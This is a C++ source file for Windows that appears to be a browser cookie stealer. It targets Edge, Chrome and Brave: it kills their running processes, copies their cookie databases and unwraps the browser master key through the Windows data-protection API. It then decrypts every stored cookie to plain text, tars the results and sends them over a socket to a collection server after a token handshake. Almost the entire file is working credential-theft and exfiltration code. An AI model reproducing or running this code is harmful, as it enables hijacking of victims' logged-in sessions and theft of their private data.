#ifdef _WIN32
#define NOMINMAX
#endif // _WIN32

#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <jwt-cpp/jwt.h>
#include <chrono>
#include <boost/asio.hpp>
#include <tlhelp32.h>
#include <shlobj.h>
#include <zip.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <iostream>
#include <vector>
#include <filesystem>
#include <wincrypt.h>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <archive.h>
#include <archive_entry.h>

#pragma comment(lib, "crypt32.lib")


using boost::asio::ip::tcp;
namespace fs = std::filesystem;
using namespace std;

// Function to check if the program is running as administrator
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }
    return isAdmin == TRUE;
}

// Function to kill a process by name
bool KillProcessByName(LPCWSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    bool processTerminated = false;

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (lstrcmpi(pe.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    if (TerminateProcess(hProcess, 0)) {
                        // Wait for the process to fully terminate
                        if (WaitForSingleObject(hProcess, 5000) == WAIT_OBJECT_0) {
                            processTerminated = true;
                        }
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return processTerminated;
}

//Function to check process running
bool IsProcessRunning(const WCHAR* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;


    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        const WCHAR* errorMessage = L"Failed to retrieve information about the first process. ";
        const WCHAR* message = (wstring(errorMessage) + processName).c_str();
        MessageBox(NULL, message, L"Information", MB_OK | MB_ICONINFORMATION);
        return false;
    }

    do {
        if (lstrcmpi(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return true;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return false;
}


//App data path getting current user genarate function
wstring GetAppDataPath() {
    WCHAR path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        return std::wstring(path);
    }
    else {
        return L"";
    }
}


// Function to create a directory
bool CreateFolder(const wstring& folderPath) {
    if (CreateDirectory(folderPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        return true;
    }
    else {
        wcerr << L"Failed to create folder: " << folderPath << endl;
        return false;
    }
}

// Function to check if a file exists
bool FileExists(const wstring& path) {
    return fs::exists(path);
}


struct targetBrowser {
    wstring name;
    wstring destCookie;
    const  WCHAR* proccessName;
    int statusAttack = 0;
    int isRunning = 0;
    wstring basePath;
};





//Adding file in to created zip
bool addFileToZip(zip_t* zip, const fs::path& filePath, const std::string& relativePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return false;
    }

    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    zip_source_t* source = zip_source_buffer(zip, buffer.data(), buffer.size(), 0);
    if (source == nullptr) {
        std::cerr << "Failed to create zip source for file: " << filePath << std::endl;
        return false;
    }

    if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE | ZIP_FL_ENC_UTF_8) < 0) {
        std::cerr << "Failed to add file to zip: " << filePath << " Error: " << zip_strerror(zip) << std::endl;
        zip_source_free(source);
        return false;
    }

    return true;
}


//Creating zip file
bool zipFolder(const fs::path& folderPath, const fs::path& zipPath) {
    int error = 0;
    zip_t* zip = zip_open(zipPath.string().c_str(), ZIP_CREATE | ZIP_TRUNCATE, &error);
    if (zip == nullptr) {
        zip_error_t ziperror;
        zip_error_init_with_code(&ziperror, error);
        std::cerr << "Failed to open zip archive: " << zip_error_strerror(&ziperror) << std::endl;
        zip_error_fini(&ziperror);
        return false;
    }

    for (const auto& entry : fs::recursive_directory_iterator(folderPath)) {
        if (fs::is_regular_file(entry.path())) {
            fs::path relativePath = fs::relative(entry.path(), folderPath);
            if (!addFileToZip(zip, entry.path(), relativePath.string())) {
                zip_close(zip);
                return false;
            }
        }
    }

    if (zip_close(zip) < 0) {
        std::cerr << "Failed to close zip archive: " << zip_strerror(zip) << std::endl;
        return false;
    }

    return true;
}



//Tar files creating

bool addFileToTar(struct archive* a, const fs::path& filePath, const std::string& relativePath) {
    struct archive_entry* entry = archive_entry_new();
    if (!entry) {
        std::cerr << "Failed to create archive entry." << std::endl;
        return false;
    }

    archive_entry_set_pathname(entry, relativePath.c_str());
    archive_entry_set_size(entry, fs::file_size(filePath));
    archive_entry_set_filetype(entry, AE_IFREG);
    archive_entry_set_perm(entry, 0644);
    archive_write_header(a, entry);

    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        archive_entry_free(entry);
        return false;
    }

    char buffer[8192];
    while (file.read(buffer, sizeof(buffer))) {
        archive_write_data(a, buffer, file.gcount());
    }
    archive_write_data(a, buffer, file.gcount());

    file.close();
    archive_entry_free(entry);
    return true;
}


//First create tar file
bool tarFolder(const fs::path& folderPath, const fs::path& tarPath) {
    struct archive* a = archive_write_new();
    if (!a) {
        std::cerr << "Failed to create archive." << std::endl;
        return false;
    }

    archive_write_add_filter_none(a);
    archive_write_set_format_pax_restricted(a);

    if (archive_write_open_filename(a, tarPath.string().c_str()) != ARCHIVE_OK) {
        std::cerr << "Failed to open tar file: " << archive_error_string(a) << std::endl;
        archive_write_free(a);
        return false;
    }

    for (const auto& entry : fs::recursive_directory_iterator(folderPath)) {
        if (fs::is_regular_file(entry.path())) {
            cout << is_regular_file(entry.path()) << endl;
            fs::path relativePath = fs::relative(entry.path(), folderPath);
            cout << relativePath << endl;


            //Avoiding pushing Cookies.tar in to Cookie.tar
            if (relativePath != "Cookies.tar") {
                if (!addFileToTar(a, entry.path(), relativePath.string())) {
                    archive_write_free(a);
                    return false;
                }
            }

        }
    }

    if (archive_write_close(a) != ARCHIVE_OK) {
        std::cerr << "Failed to close tar file: " << archive_error_string(a) << std::endl;
        archive_write_free(a);
        return false;
    }

    archive_write_free(a);
    return true;
}


//Loading public key from the .pem
string LoadKey(const string& file_path) {
    ifstream key_file(file_path);
    if (!key_file.is_open()) {
        throw runtime_error("Could not open key file");
    }
    stringstream key_stream;
    key_stream << key_file.rdbuf();
    return key_stream.str();
}


//Sending file over socket
bool SendFileOverSocket(tcp::socket& socket, const string& file_path, const string& token) {

    boost::system::error_code ignored_error;


    ifstream file(file_path, ios::binary);
    if (!file.is_open()) {
        cerr << "Failed to open file: " << file_path << endl;
        return false;
    }

    // Determine file size
    file.seekg(0, ios::end);
    if (file.fail()) {
        cerr << "Failed to seek to end of file: " << file_path << endl;
        return false;
    }

    size_t file_size = file.tellg();
    if (file_size == static_cast<size_t>(-1)) {
        cerr << "Failed to read file size: " << file_path << endl;
        return false;
    }

    file.seekg(0, ios::beg);
    if (file.fail()) {
        cerr << "Failed to seek to beginning of file: " << file_path << endl;
        return false;
    }

    // Read file content into buffer
    vector<char> buffer(file_size);
    file.read(buffer.data(), file_size);
    if (!file) {
        cerr << "Failed to read file content: " << file_path << endl;
        return false;
    }

    // Send file size
    boost::asio::write(socket, boost::asio::buffer(&file_size, sizeof(file_size)), ignored_error);

    // Send file content
    boost::asio::write(socket, boost::asio::buffer(buffer), ignored_error);

    cout << "File sent successfully!" << endl;
    return true;
}


//JWT token veryfy
bool VerifyToken(const string& token, const string& public_key) {
    try {
        auto decoded = jwt::decode(token);
        auto verifier = jwt::verify()
            .allow_algorithm(jwt::algorithm::rs256(public_key, "", "", "RS256"))
            .with_subject("user@example.com")
            .with_issuer("your-app");

        verifier.verify(decoded);
        return true;
    }
    catch (const std::exception& e) {
        cerr << "JWT verification failed: " << e.what() << endl;
        return false;
    }
}



//Class for decrypt cookies file
class ChromeCookieRetriever {
public:
    struct Cookie {
        std::string name;
        std::string value;
        std::string path;
        std::string domain;
    };

    ChromeCookieRetriever() = default;

    std::vector<Cookie> GetCookies(const std::string& baseFolder, const std::string& workingDirectory, const std::string& nameCookie) {
        std::vector<Cookie> cookies;
        std::vector<unsigned char> key = GetKey(baseFolder);
        ReadFromDb(workingDirectory, nameCookie, key, cookies);
        return cookies;
    }


    //Decrypted cookie save as .csv
    void SaveCookiesToCsv(const std::vector<Cookie>& cookies, const std::string& csvFilePath) {
        std::ofstream file(csvFilePath + ".csv");
        if (!file.is_open()) {
            throw std::runtime_error("Failed to open CSV file for writing");
        }

        // Write CSV header
        file << "Name,Value,Path,Domain\n";

        // Write each cookie to the CSV file
        for (const auto& cookie : cookies) {
            file << cookie.name << ","
                << cookie.value << ","
                << cookie.path << ","
                << cookie.domain << "\n";
        }

        file.close();
    }

    //Decrypted cookie save as .txt
    void SaveCookiesToText(const std::vector<Cookie>& cookies, const std::string& textFilePath) {
        std::ofstream file(textFilePath + ".txt");
        if (!file.is_open()) {
            throw std::runtime_error("Failed to open text file for writing");
        }

        // Write each cookie to the text file
        for (const auto& cookie : cookies) {
            file << "Name: " << cookie.name << "\n"
                << "Value: " << cookie.value << "\n"
                << "Path: " << cookie.path << "\n"
                << "Domain: " << cookie.domain << "\n"
                << "-----------------------------\n";
        }

        file.close();
    }


private:

    //Local state directory for genarating key file to decrypt
    const std::string LocalStateFileName = "Local State";

    std::vector<unsigned char> GetKey(const std::string& baseFolder) {
        std::string filePath = baseFolder + "\\" + LocalStateFileName;

        // Check if file exists
        std::ifstream file(filePath);
        if (!file.is_open()) {
            throw std::runtime_error("Failed to open Local State file: " + filePath);
        }

        // Read file content
        std::string localStateContent((std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
        file.close();

        // Check if content is empty
        if (localStateContent.empty()) {
            throw std::runtime_error("Local State file is empty: " + filePath);
        }

        // Parse JSON content
        auto json = nlohmann::json::parse(localStateContent, nullptr, false);
        if (json.is_discarded()) {
            throw std::runtime_error("Failed to parse Local State JSON content: " + localStateContent);
        }

        std::string encryptedKeyBase64 = json["os_crypt"]["encrypted_key"];
        std::vector<unsigned char> encryptedKey = Base64Decode(encryptedKeyBase64);

        std::vector<unsigned char> key(encryptedKey.begin() + 5, encryptedKey.end());
        return UnprotectData(key);
    }

    std::vector<unsigned char> Base64Decode(const std::string& encoded) {
        DWORD decodedLength;
        CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &decodedLength, nullptr, nullptr);

        std::vector<unsigned char> decoded(decodedLength);
        CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &decodedLength, nullptr, nullptr);
        return decoded;
    }

    std::vector<unsigned char> UnprotectData(const std::vector<unsigned char>& data) {
        DATA_BLOB inputBlob, outputBlob;
        inputBlob.pbData = const_cast<BYTE*>(data.data());
        inputBlob.cbData = data.size();

        if (!CryptUnprotectData(&inputBlob, nullptr, nullptr, nullptr, nullptr, 0, &outputBlob)) {
            throw std::runtime_error("Failed to unprotect data");
        }

        std::vector<unsigned char> unprotectedData(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
        LocalFree(outputBlob.pbData);
        return unprotectedData;
    }

    void ReadFromDb(const std::string& workingDirectory, const std::string& nameCookie, const std::vector<unsigned char>& key, std::vector<Cookie>& cookies) {
        std::string dbFileName = workingDirectory + "\\" + nameCookie;
        std::cout << dbFileName << endl;
        sqlite3* db;
        if (sqlite3_open(dbFileName.c_str(), &db) != SQLITE_OK) {
            throw std::runtime_error("Failed to open SQLite database: " + dbFileName);
        }

        sqlite3_stmt* stmt;
        std::string query = "SELECT name, encrypted_value, host_key, path FROM cookies";
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            throw std::runtime_error("Failed to prepare SQLite statement");
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char* name = reinterpret_cast<const unsigned char*>(sqlite3_column_text(stmt, 0));
            const unsigned char* encrypted_value = reinterpret_cast<const unsigned char*>(sqlite3_column_blob(stmt, 1));
            int encrypted_value_size = sqlite3_column_bytes(stmt, 1);
            const unsigned char* host_key = reinterpret_cast<const unsigned char*>(sqlite3_column_text(stmt, 2));
            const unsigned char* path = reinterpret_cast<const unsigned char*>(sqlite3_column_text(stmt, 3));

            std::vector<unsigned char> encryptedCookie(encrypted_value, encrypted_value + encrypted_value_size);

            // Check the size of the encrypted cookie data
            if (encryptedCookie.size() < 3 + 12 + 16) {
                std::cerr << "Invalid encrypted cookie size: " << encryptedCookie.size() << std::endl;
                continue;
            }

            std::string value;
            try {
                value = DecryptCookie(key, encryptedCookie);
            }
            catch (const std::exception& ex) {
                std::cerr << "Failed to decrypt cookie: " << ex.what() << std::endl;
                continue;
            }

            cookies.push_back(Cookie{
                std::string(reinterpret_cast<const char*>(name)),
                value,
                std::string(reinterpret_cast<const char*>(path)),
                std::string(reinterpret_cast<const char*>(host_key))
                });
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }

    std::string DecryptCookie(const std::vector<unsigned char>& masterKey, const std::vector<unsigned char>& cookie) {
        std::vector<unsigned char> nonce(cookie.begin() + 3, cookie.begin() + 15);
        std::vector<unsigned char> ciphertext(cookie.begin() + 15, cookie.end() - 16);
        std::vector<unsigned char> tag(cookie.end() - 16, cookie.end());

        std::vector<unsigned char> decrypted(ciphertext.size());

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            throw std::runtime_error("Failed to create EVP_CIPHER_CTX");
        }

        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("EVP_DecryptInit_ex failed");
        }

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, nonce.size(), nullptr) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("EVP_CIPHER_CTX_ctrl failed");
        }

        if (EVP_DecryptInit_ex(ctx, nullptr, nullptr, masterKey.data(), nonce.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("EVP_DecryptInit_ex (key/IV) failed");
        }

        int len;
        if (EVP_DecryptUpdate(ctx, decrypted.data(), &len, ciphertext.data(), ciphertext.size()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("EVP_DecryptUpdate failed");
        }

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, tag.size(), tag.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            throw std::runtime_error("EVP_CIPHER_CTX_ctrl (set tag) failed");
        }

        int ret = EVP_DecryptFinal_ex(ctx, decrypted.data() + len, &len);
        EVP_CIPHER_CTX_free(ctx);

        if (ret <= 0) {
            throw std::runtime_error("EVP_DecryptFinal_ex failed");
        }

        return std::string(decrypted.begin(), decrypted.end());
    }
};




int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    // Check if running as administrator
    if (!IsRunningAsAdmin()) {
        MessageBox(NULL, L"This program requires administrator privileges.", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }



    //Getting curennt user appdata path 

    wstring appDataPath = GetAppDataPath();
    const WCHAR* wsappDataPath = appDataPath.c_str();
    if (appDataPath.empty()) {
        std::wcerr << L"Failed to get AppData path" << std::endl;
        return 1;
    }



    //Browser process names
    const WCHAR* brProcessname[] = {
        L"msedge.exe",
        L"chrome.exe",
        L"brave.exe"
    };


    //Browser cookie path
    const WCHAR* brCookiepath[] = {
        L"\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
        L"\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
        L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
    };

    //Browser base path
    wstring edge = appDataPath + L"\\Microsoft\\Edge\\User Data\\";
    wstring chrome = appDataPath + L"\\Google\\Chrome\\User Data\\";
    wstring brave = appDataPath + L"\\BraveSoftware\\Brave-Browser\\User Data\\";

    const WCHAR* brBasepath[] = {

        edge.c_str(),
        chrome.c_str(),
        brave.c_str(),

    };

    //Browser installation path
    const WCHAR* brPathinstalled[] = {
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
    };

    const WCHAR* brPathinstalled64[] = {
        L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
    };



    //Array length
    int brProcessnum = sizeof(brProcessname) / sizeof(brProcessname[0]);

    //Creating for vector to store different browser struct
    vector<targetBrowser> browsers;



    for (int i = 0; i < brProcessnum; ++i) {

        //Remove .exe from process
        const WCHAR* nameW;
        wstring name(brProcessname[i]);
        size_t pos = name.find(L".exe");
        if (pos != std::wstring::npos) {
            name = name.erase(pos, 4);
            nameW = name.c_str(); // 4 is the length of ".exe"
        }

        if (IsProcessRunning(brProcessname[i])) {
            std::wcout << brProcessname[i] << L" is running." << std::endl;
            //Debugging purpose
            //MessageBox(NULL, brProcessname[i], L"Information", MB_OK | MB_ICONINFORMATION);


            targetBrowser browser = {
                name,
                appDataPath + brCookiepath[i],
                brProcessname[i],
                1,
                1,
                brBasepath[i],
            };

            //Pushing into vector that instance
            browsers.push_back(browser);

        }
        else {
            //If there not running process check installation folder
            if (FileExists(brPathinstalled[i]) || FileExists(brPathinstalled64[i])) {

                targetBrowser browser = {
                    name,
                    appDataPath + brCookiepath[i],
                    brProcessname[i],
                    1,
                    0,
                    brBasepath[i],
                };

                //Pushing into vector that instance
                browsers.push_back(browser);

            }
            else {
                //wstring proName = name + L" is not installed";

                //Debugging purpose
                //MessageBox(NULL, proName.c_str(), L"Information", MB_OK | MB_ICONINFORMATION);
            }
        }

    };

    //Creating directory
    wstring workingPath = appDataPath + L"\\crbishere\\";
    string sworkingPath(workingPath.begin(), workingPath.end());
    if (CreateFolder(workingPath)) {
        std::cout << "Successfully created folder " << sworkingPath << endl;
        //Debugging purpose
        //MessageBox(NULL, L"Successfully created folder", L"Error", MB_OK | MB_ICONERROR);
    }
    else {
        std::cout << "Failed to create folder " << sworkingPath << endl;
        //Debugging purpose
        //MessageBox(NULL, L"Failed to create folder", L"Error", MB_OK | MB_ICONERROR);
    }



    // Backup cookies for each browser
    for (const auto& browser : browsers) {

        //Debugging purpose
        //MessageBox(NULL, (browser.name).c_str(), L"Error", MB_OK | MB_ICONERROR);
        //MessageBox(NULL, (browser.destCookie).c_str(), L"Error", MB_OK | MB_ICONERROR);
        //MessageBox(NULL, browser.proccessName, L"Error", MB_OK | MB_ICONERROR);
        //MessageBox(NULL, (workingPath + browser.name + L"_Cookies").c_str(), L"Error", MB_OK | MB_ICONERROR);
        //MessageBox(NULL, (browser.basePath).c_str(), L"Error", MB_OK | MB_ICONERROR);

        if (browser.statusAttack == 1) {

            //Kill only running process
            if (browser.isRunning == 1) {
                // Kill the each process
                if (KillProcessByName(browser.proccessName)) {
                    wstring proName = browser.name + L" closed successfully";
                    //string sproName(proName.begin(), proName.end());

                    //Debugging purpose
                    //MessageBox(NULL, proName.c_str(), L"Information", MB_OK | MB_ICONINFORMATION);

                    //std::cout << sproName << endl;

                    // copy the cookies file
                    if (CopyFile((browser.destCookie).c_str(), (workingPath + browser.name + L"_Cookies").c_str(), FALSE)) {
                        std::cout << "Cookies file copied successfully." << endl;

                        //Debugging purpose
                        //MessageBox(NULL, L"Cookies file copied successfully.", L"Information", MB_OK | MB_ICONINFORMATION);
                    }
                    else {
                        std::cout << "Failed to copy Cookies file." << endl;

                        //Debugging purpose
                        //MessageBox(NULL, L"Failed to copy Cookies file.", L"Error", MB_OK | MB_ICONERROR);
                    }

                    //Extracting file and saving master key 
                    try {
                        ChromeCookieRetriever retriever;

                        wstring wsbasePath = browser.basePath;
                        string sbasePath(wsbasePath.begin(), wsbasePath.end());
                        wstring wsworkingPath = workingPath;
                        string sworkingPath(wsworkingPath.begin(), wsworkingPath.end());
                        wstring sbrCookie = browser.name + L"_Cookies";
                        string sbrName((sbrCookie).begin(), (sbrCookie).end());


                        std::cout << sbasePath << "\n" << sworkingPath << "\n" << sbrName << "\n" << endl;



                        auto cookies = retriever.GetCookies(sbasePath, sworkingPath, sbrName);
                        retriever.SaveCookiesToCsv(cookies, sworkingPath + sbrName);
                        retriever.SaveCookiesToText(cookies, sworkingPath + sbrName);

                        for (const auto& cookie : cookies) {
                            std::cout << "Name: " << cookie.name << ", Value: " << cookie.value
                                << ", Domain: " << cookie.domain << ", Path: " << cookie.path << std::endl;
                        }
                    }
                    catch (const std::exception& ex) {
                        std::cerr << "Error: " << ex.what() << std::endl;
                    }

                }
                else {
                    wstring proName = L"Failed to close " + browser.name + L" is not running";
                    string sproName(proName.begin(), proName.end());
                    std::cout << sproName << endl;
                    //Debuging purpose
                    //MessageBox(NULL, proName.c_str(), L"Error", MB_OK | MB_ICONERROR);
                }
            }
            else {

                // copy the cookies file
                if (CopyFile((browser.destCookie).c_str(), (workingPath + browser.name + L"_Cookies").c_str(), FALSE)) {

                    std::cout << "Cookies file copied successfully." << endl;

                    //Debugging purpose
                    //MessageBox(NULL, L"Cookies file copied successfully.", L"Information", MB_OK | MB_ICONINFORMATION);


                    //Extracting file and saving master key 
                    try {
                        ChromeCookieRetriever retriever;

                        wstring wsbasePath = browser.basePath;
                        string sbasePath(wsbasePath.begin(), wsbasePath.end());
                        wstring wsworkingPath = workingPath;
                        string sworkingPath(wsworkingPath.begin(), wsworkingPath.end());
                        wstring sbrCookie = browser.name + L"_Cookies";
                        string sbrName((sbrCookie).begin(), (sbrCookie).end());

                        std::cout << sbasePath << "\n" << sworkingPath << "\n" << sbrName << "\n" << endl;

                        auto cookies = retriever.GetCookies(sbasePath, sworkingPath, sbrName);
                        retriever.SaveCookiesToCsv(cookies, sworkingPath + sbrName);
                        retriever.SaveCookiesToText(cookies, sworkingPath + sbrName);

                        for (const auto& cookie : cookies) {
                            std::cout << "Name: " << cookie.name << ", Value: " << cookie.value
                                << ", Domain: " << cookie.domain << ", Path: " << cookie.path << std::endl;
                        }
                    }
                    catch (const std::exception& ex) {
                        std::cerr << "Error: " << ex.what() << std::endl;
                    }

                }
                else {
                    std::cout << "Failed to copy Cookies file." << endl;

                    //Debugging purpose
                    //MessageBox(NULL, L"Failed to copy Cookies file.", L"Error", MB_OK | MB_ICONERROR);
                }

            }


        }
        else {
            std::cout << "No any specified browser installed." << endl;

            //Debugging purpose
            //MessageBox(NULL, L"No any browser installed.", L"Error", MB_OK | MB_ICONERROR);
        }



    };




    //Final step before sending folder zipping

    wstring tarPath = workingPath + L"Cookies.tar";
    string starPath(tarPath.begin(), tarPath.end());

    //If you need to use zip file you can use this function
    //if (zipFolder(workingPath, zipPath)) {
    //    MessageBox(NULL, L"Folder zipped successfully!", L"Information", MB_OK | MB_ICONINFORMATION);
    //}
    //else {
    //    MessageBox(NULL, L"Failed to zip folder.", L"Error", MB_OK | MB_ICONERROR);
    //}

    if (tarFolder(sworkingPath, starPath)) {
        std::cout << "Folder successfully compressed to " << starPath << std::endl;
    }
    else {
        std::cerr << "Failed to compress folder" << std::endl;
    }




    //Triggering to connect socket and send the file

    try {
        boost::asio::io_context io_context;

        // Resolve the server address and port
        tcp::resolver resolver(io_context);
        tcp::resolver::results_type endpoints = resolver.resolve("127.0.0.1", "8080");



        // Create and connect the socket
        tcp::socket socket(io_context);

        try
        {
            boost::asio::connect(socket, endpoints);
            std::cout << "Connected to the server!" << endl;


            //Debugging purpose
            //MessageBox(NULL, L"Connected to the server!", L"Error", MB_OK | MB_ICONERROR);

        }
        catch (const boost::system::system_error& e)
        {

            std::cout << "Failed to connect." << endl;

            //Debugging purpose
            //MessageBox(NULL, L"Failed to connect.", L"Error", MB_OK | MB_ICONERROR);

            return 0;
        }



        // Receive the JWT token
        boost::asio::streambuf response;
        boost::system::error_code error;

        boost::asio::read_until(socket, response, '\n', error);

        if (error && error != boost::asio::error::eof) {
            cerr << "Failed to read JWT token: " << error.message() << endl;
            return false;
        }

        istream response_stream(&response);
        string token;
        getline(response_stream, token);

        string public_key = LoadKey("public_key.pem");

        //String to wstring
        wstring wspublic_key(public_key.begin(), public_key.end());
        wstring wstoken(token.begin(), token.end());

        //Debugging purpose
        //MessageBox(NULL, wspublic_key.c_str(), L"Error", MB_OK | MB_ICONERROR);
        //MessageBox(NULL, wstoken.c_str(), L"Error", MB_OK | MB_ICONERROR);

        cout << "Recieved token = {" << token +"}" << endl;



        if (!VerifyToken(token, public_key)) {
            cerr << "Invalid JWT token received." << endl;

        }
        else {

            //Reading the decoded payload from the JWT 
            auto decoded = jwt::decode(token);

            std::string name, pass; // Declare variables outside the loop

            //Geting in to varible 
            for (const auto& e : decoded.get_payload_json()) {
                std::cout << e.first << " = " << e.second << std::endl;
                if (e.first == "name") {
                    name = e.second.get<std::string>(); // Assign value to 'name' if key is 'name'
                }
                else if (e.first == "pass") {
                    pass = e.second.get<std::string>(); // Assign value to 'pass' if key is 'pass'
                }
            }

            std::cout << "Name: " << name << std::endl;
            std::cout << "Password: " << pass << std::endl;

            //Sending to the server for veryfication. if cant veryfy that token name and pass server closing the connection

            boost::system::error_code ignored_error;
            boost::asio::write(socket, boost::asio::buffer(name + "\n" + pass + "\n"), ignored_error);

        }





        //MessageBox(NULL, wstoken.c_str(), L"Error", MB_OK | MB_ICONERROR);

        //MessageBox(NULL, file_path, L"Error", MB_OK | MB_ICONERROR);

        if (!SendFileOverSocket(socket, starPath, token)) {
            cerr << "Failed to send the file." << endl;

            //Debugging purpose
            //MessageBox(NULL, L"Failed to send the file.", L"Error", MB_OK | MB_ICONERROR);

        }
        else {
            std::cout << "Sending success." << endl;

            //Debugging purpose
            //MessageBox(NULL, L"Sending success.", L"Error", MB_OK | MB_ICONERROR);
        }

    }
    catch (exception& e) {
        cerr << "Exception: " << e.what() << endl;
    }







    return 0;




}